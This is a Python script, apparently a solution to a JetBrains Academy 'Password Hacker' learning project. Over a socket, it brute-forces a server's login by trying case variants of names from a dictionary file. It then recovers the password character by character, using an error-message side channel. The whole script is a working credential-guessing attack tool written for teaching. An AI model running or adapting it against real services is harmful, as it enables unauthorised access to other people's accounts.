"""
Password Hacker project from JetBrains Academy
"""

import argparse
import itertools
import json
import socket


def attempt_login(dict_file, text_file='logins.txt'):
    """
    Attempts to find the correct login name from a dictionary of admin logins.  This function
    cycles through all upper and lowercase characters contained within the name.
    """
    with open(text_file) as text:
        for line in text:
            login = line.strip()
            temp = map(''.join, itertools.product(*((char.upper(), char.lower()) if char.isalpha()
                                                    else char for char in login)))
            for entry in temp:
                dict_file['login'] = entry
                new = json.dumps(dict_file)
                h.send(new.encode())
                response = json.loads(h.recv(1024).decode())
                if response['result'] == 'Wrong password!':
                    return dict_file
                elif response['result'] == 'Wrong login!':
                    dict_file['login'] = ' '
                    continue


def attempt_password(dict_file, char):
    """
    This function attempts to brute force the password using the itertools chain function
    and concatenation for an infinite number of characters
    """
    attempt = ''
    while True:
        for entry in itertools.chain(char):
            attempt += entry
            dict_file['password'] = attempt
            new = json.dumps(dict_file)
            h.send(new.encode())
            response = json.loads(h.recv(1024).decode())
            if response['result'] == 'Connection success!':
                return dict_file
            elif response['result'] == 'Wrong password!':
                if len(attempt) > 1:
                    attempt = attempt[:-1]
                else:
                    attempt = ''
            elif response['result'] == 'Exception happened during login':
                break


pass_hacker = argparse.ArgumentParser(description='An automated password hacker')
pass_hacker.add_argument("hostname", type=str, help='the IP address or domain name of the site you are trying to hack')
pass_hacker.add_argument("port", type=int, help='the port number of the site you are trying to hack')
args = pass_hacker.parse_args()

hacker = socket.socket()
address = (args.hostname, args.port)
credentials = {
    'login': ' ',
    'password': ' '
}
char_list = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + [chr(i) for i in range(48, 58)]

with hacker as h:
    h.connect(address)
    credentials = attempt_login(credentials)
    credentials = attempt_password(credentials, char_list)
    print(json.dumps(credentials, indent=4))
